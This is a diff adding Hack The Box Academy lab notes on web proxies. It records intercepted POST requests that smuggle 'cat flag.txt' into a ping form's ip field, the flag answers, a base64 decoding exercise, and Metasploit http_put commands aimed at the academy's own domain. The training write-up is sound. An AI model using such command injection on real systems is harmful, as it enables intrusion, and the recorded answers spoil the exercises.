@@ -2240,6 +2240,185 @@ Results: cf3a5525ee9414229e66279623ed5c58
 
 ## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)
 
+### Intercepting Web Requests
+
+Try intercepting the ping request on the server shown above, and change the post data similarly to what we did in this section. Change the command to read 'flag.txt'
+
+```
+# After intercepting the request, we enter:
+POST /ping HTTP/1.1
+Host: 94.237.59.24:51204
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 17
+Origin: http://94.237.59.24:51204
+Connection: close
+Referer: http://94.237.59.24:51204/
+Upgrade-Insecure-Requests: 1
+
+ip=1;cat flag.txt
+```
+
+The response:
+
+```
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Date: Sun, 20 Oct 2024 18:17:29 GMT
+Connection: close
+Content-Length: 282
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms
+HTB{1n73rc3p73d_1n_7h3_m1ddl3}
+```
+
+Results: HTB{1n73rc3p73d_1n_7h3_m1ddl3}
+
+### Repeating Requests
+
+**Try using request repeating to be able to quickly test commands. With that, try looking for the other flag.**
+
+The request:
+
+```
+POST /ping HTTP/1.1
+Host: 94.237.59.24:51204
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+Origin: http://94.237.59.24:51204
+Connection: close
+Referer: http://94.237.59.24:51204/
+Upgrade-Insecure-Requests: 1
+
+ip=1;cat /flag.txt
+```
+
+The response:
+
+```
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Date: Sun, 20 Oct 2024 18:37:28 GMT
+Connection: close
+Content-Length: 283
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
+HTB{qu1ckly_r3p3471n6_r3qu3575}
+
+```
+
+
+Results: HTB{qu1ckly_r3p3471n6_r3qu3575}
+ 
+### Encoding/Decoding
+
+Question. 
+
+
+
+```
+# The provided file contains the text:
+VTJ4U1VrNUZjRlZXVkVKTFZrWkdOVk5zVW10aFZYQlZWRmh3UzFaR2NITlRiRkphWld0d1ZWUllaRXRXUm10M1UyeFNUbVZGY0ZWWGJYaExWa1V3ZVZOc1VsZGlWWEJWVjIxNFMxWkZNVFJUYkZKaFlrVndWVmR0YUV0V1JUQjNVMnhTYTJGM1BUMD0=
+
+# It is base64 text. You need to decode in base64 4 times until getting an url encoded. First:
+cat encoded_flag.txt | base64 -d | tee encoded2.txt
+# U2xSUk5FcFVWVEJLVkZGNVNsUmthVXBVVFhwS1ZGcHNTbFJaZWtwVVRYZEtWRmt3U2xSTmVFcFVXbXhLVkUweVNsUldiVXBVV214S1ZFMTRTbFJhYkVwVVdtaEtWRTB3U2xSa2F3PT0=
+
+cat encoded2.txt | base64 -d | tee encoded3.txt
+# SlRRNEpUVTBKVFF5SlRkaUpUTXpKVFpsSlRZekpUTXdKVFkwSlRNeEpUWmxKVE0ySlRWbUpUWmxKVE14SlRabEpUWmhKVE0wSlRkaw==
+
+cat encoded3.txt | base64 -d | tee encoded4.txt
+# JTQ4JTU0JTQyJTdiJTMzJTZlJTYzJTMwJTY0JTMxJTZlJTM2JTVmJTZlJTMxJTZlJTZhJTM0JTdk
+
+cat encoded4.txt | base64 -d | tee encoded5.txt
+# %48%54%42%7b%33%6e%63%30%64%31%6e%36%5f%6e%31%6e%6a%34%7d
+
+# Enter it in Decoder in Burpsuite 
+HTB{3nc0d1n6_n1nj4}
+```
+
+Results: HTB{3nc0d1n6_n1nj4}
+
+### Proxying Tools
+
+Question. 
+```
+# Start metasploit
+msfconsole -q
+
+# Then, to set a proxy for any exploit within Metasploitwith the `set PROXIES` flag. 
+set PROXIES HTTP:127.0.0.1:8080
+
+use auxiliary/scanner/http/http_put
+
+set RHOSTS https://academy.hackthebox.com/
+
+run
+```
+
+Results: msf test file
+
+
+### Burp Intruder
+
+Question. 
+
+```
+
+```
+
+Results: 
+
+ 
+### ZAP Fuzzer
+
+Question. 
+
+```
+
+```
+
+Results: 
+
+### ZAP Scanner
+
+Question. 
+
+```
+
+```
+
+Results: 
+
+
+### Skills Assessment - Using Web Proxies
+
+Question. 
+
+```
+
+```
+
+Results: 
+
+
 ## [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54)
 
 ### Basic Fuzzing
